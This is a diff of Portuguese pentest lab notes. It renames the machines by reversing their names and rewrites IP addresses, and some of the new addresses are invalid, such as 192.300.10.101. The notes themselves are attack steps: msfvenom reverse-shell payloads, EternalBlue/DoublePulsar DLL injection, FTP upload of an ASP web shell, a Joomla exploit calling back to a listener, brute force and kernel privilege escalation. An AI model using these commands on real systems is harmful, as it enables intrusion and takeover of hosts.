@@ -4983,21 +4983,21 @@ THAT'S ALL FOLKS
 
 ### PENTEST EXPERIENCE
 
-- SILK
+- KLIS
 
-Host Silk: 
+Host KLIS: 
 
         https://www.100security.com.br/ms17-010 #eternalblue #doublepulsar 
 
-172.16.1.145
+192.168.1.145
 
-Alternativo Host Silk 145:  
+Alternativo Host KLIS 145:  
 
         https://github.com/sailay1996/eternal-pulsar
 
 Fazer o clone do repositório e entrar na pasta depens.
 
-	msfvenom -p windows/shell_reverse_tcp LHOST=172.20.1.73 LPORT=8080 -f dll > shell.dll
+	msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.73 LPORT=8080 -f dll > shell.dll
 
 Cria payload para shell reverso
 
@@ -5009,9 +5009,9 @@ Em outro terminal:
 
 No terminal do wine:
 
-	Eternalblue-2.2.0.exe --TargetIp 172.16.1.145 --Target WIN72K8R2 --DaveProxyPort=0 --NetworkTimeout 60 --TargetPort 445 --VerifyTarget True --VerifyBackdoor True --MaxExploitAttempts 3 --GroomAllocations 12 --OutConfig 1.txt
+	Eternalblue-2.2.0.exe --TargetIp 192.168.1.145 --Target WIN72K8R2 --DaveProxyPort=0 --NetworkTimeout 60 --TargetPort 445 --VerifyTarget True --VerifyBackdoor True --MaxExploitAttempts 3 --GroomAllocations 12 --OutConfig 1.txt
 
-	Doublepulsar-1.3.1.exe --OutConfig 2.txt --TargetIp 172.16.1.145 --TargetPort 445 --DllPayload shell.dll --DllOrdinal 1 --ProcessName svchost.exe --ProcessCommandLine --Protocol SMB --Architecture x86 --Function Rundll
+	Doublepulsar-1.3.1.exe --OutConfig 2.txt --TargetIp 192.168.1.145 --TargetPort 445 --DllPayload shell.dll --DllOrdinal 1 --ProcessName svchost.exe --ProcessCommandLine --Protocol SMB --Architecture x86 --Function Rundll
 
 Os dois comando acima vai mandar a shell no terminal que tava com a porta aberta pelo nc
 
@@ -5032,7 +5032,7 @@ Na shell do alvo:
 
 Acessa a máquina com login e senha criado acima
 
-172.16.1.140
+192.168.1.140
 
 Elevar privilégios para acessar as pastas do... Após descobrir a Vulnerabilidade DiffieHellman pesquisar exploit... e prosseguir com as máquinas…
 
@@ -5046,9 +5046,9 @@ Seguir o tutorial
 
                 -> Salva a página no system32/cmd.exe e abrirá a shell com privilégios administrativos.
 
-Navegar pelas pastas e abrir o WinScp.exe que vai dar acesso ao host 172.20.10.5
+Navegar pelas pastas e abrir o WinScp.exe que vai dar acesso ao host 192.200.10.5
 
-172.20.10.5
+192.200.10.5
 
 Elevar privilégios no host - Nmap Exploit
 
@@ -5061,7 +5061,7 @@ https://w0lfram1te.com/privilege-escalation-with-nmap
 
 Captura as hashes e encontra a senha para o host 172.20.10.8 homologacao
 
-172.20.10.8
+192.200.10.8
 
 Elevar privilégios no host - Kernel Exploit
 
@@ -5075,11 +5075,11 @@ importar o arquivo no alvo (dar permissão) e executar
 
 
 
-- BYTEINC
+- CNIETYB
 
 Hosts:
 
-172.16.1.240
+192.168.1.240
 
 Ao descobrir uma vulnerabilidade no webmin de LFD com nmap, explorar com o exploit abaixo
 
@@ -5088,9 +5088,9 @@ Ao descobrir uma vulnerabilidade no webmin de LFD com nmap, explorar com o explo
 Ao pegar o shadow e passwd, quebrar as senhas e acessar o server via ssh,ftp...
 
 
-- ALGOR
+- ROGLA
 
-172.16.1.116
+192.168.1.116
 
 Ao descobrir as tecnologias e portas abertas, procurar por algo na url que permita mandar um arquivo pra dentro da máquina... O `acs_path=` É encontrado no código fonte como hidden
 
@@ -5106,7 +5106,7 @@ Após achar um exploit `dirtcow rootcow.c` ajustar para 32bits e executar
 
 Gera o executável (instalar pacote gcc-multilib se necessário)
 
-172.16.1.195
+192.168.1.195
 
 Após analisar a aplicação com acesso admin, no campo de upload de arquivo pode se enviar um comando em php para a máquina usando um modelo de arquivo csv, separado por vírgula.
 
@@ -5122,9 +5122,9 @@ Site para procurar comando de escalar privilégios
 Site para montar shell reverso https://www.revshells.com/
 
 
-- ALUNMAQ
+- QAMNULA
 
-Host: 172.16.1.158
+Host: 192.168.1.158
 
 Bruteforce usado Hydra
 
@@ -5141,9 +5141,9 @@ Quebrar senha xls planilha scheets:
         https://www.password-find.com/crack_office_password_js.htm
 
 
-- GWCW
+- WCWG
 
-172.16.1.110
+192.168.1.110
 
 Bruteforcer: crowbar brute force alternativo do hydra mas inferior
 
@@ -5153,7 +5153,7 @@ Exploit for rdp windows
 
 kiwi e pega as creds necessárias
 
-172.16.1.120
+192.168.1.120
 
 Não é necessário Exploit vuln cuppa cms?
 
@@ -5167,9 +5167,9 @@ Exploração via Kernel usando o metasploit com banco de dados, abrindo sessão 
 Ajuda: https://mysnippets443.wordpress.com/2020/03/09/metasploit-establish-a-ssh-session-for-further-use/
 
 
-- PROSPEC           
+- CEPSORP          
 
-172.16.1.139
+192.168.1.139
 
 ENUMERACAO com nmap, dirb e metasploit
 
@@ -5179,7 +5179,7 @@ https://www.exploit-db.com/exploits/14641 - Dir Transversal
 
 https://www.exploit-db.com/exploits/50057 - RCE
 
-172.16.1.156
+192.168.1.156
 
 ENUMERACAO com nmap, dirb e metasploit
 
@@ -5188,10 +5188,10 @@ Login e senha encontrado no lab anterior
 Upload de payload .war e ganha a shell
 
 
-- ASLA
+- ALSA
 
 
-172.16.1.155 
+192.168.1.155 
 
 Bruteforce no host com:
 
@@ -5204,30 +5204,30 @@ Client for FTP portable
 
 	https://www.ncftp.com/download/ 
 
-	curl -v –disable-epsv -u user:pass ftp://172.30.10.101:2221/Inetpub/ 
+	curl -v –disable-epsv -u user:pass ftp://192.300.10.101:2221/Inetpub/ 
 
 Conectar FTP via curl
 
-    curl -v -T "shell.asp" -u user:pass ftp://172.30.10.101:2221/Inetpub/ 
+    curl -v -T "shell.asp" -u user:pass ftp://192.300.10.101:2221/Inetpub/ 
 
 PUT via CURL
 
-    meterpreter> portfwd add -l 8088 -p 80 -r 172.30.10.101 
+    meterpreter> portfwd add -l 8088 -p 80 -r 192.300.10.101 
 
 Redirecionamento de portas `8088` local da 80 remota OU
 add regra no firewall: `any` de fora para `NAT 192.16.1.10` na  porta dest `2221`. 
-Irá no IP do firewall liberar a porta 443 apontando para o IP interno 192.16.1.10 na mesma porta
+Irá no IP do firewall liberar a porta 443 apontando para o IP interno 192.168.1.10 na mesma porta
 
 Faz upload de uma `shell.asp` no msfvenom para o ftp pasta da web e chama com um `multi/handler` escutando. E pega o meterpreter do host 172.30.10.101 que é o server interno do firewall que foi criado a regra.
 
 
-- DEVNIC
+- CINVED
 
-172.16.1.159
+192.168.1.159
 
 Joomla... https://www.exploit-db.com/exploits/47465 adaptado
 
-        python2 joomla-expl.py -t http://172.16.1.10/ --exploit --lhost 192.10.1.10 --lport 445
+        python2 joomla-expl.py -t http://192.168.1.10/ --exploit --lhost 192.10.1.10 --lport 445
 
 Depois do comando com o nc 445 aberto pega a shell reversa
 
@@ -5246,7 +5246,7 @@ PrivEsc com capabilities
         https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/
 
 
-172.16.1.148
+192.168.1.148
 
 Exploit da tecnologia usada no server drupa7-CVE-2018-7600.py (executa compilação no server alvo)
 
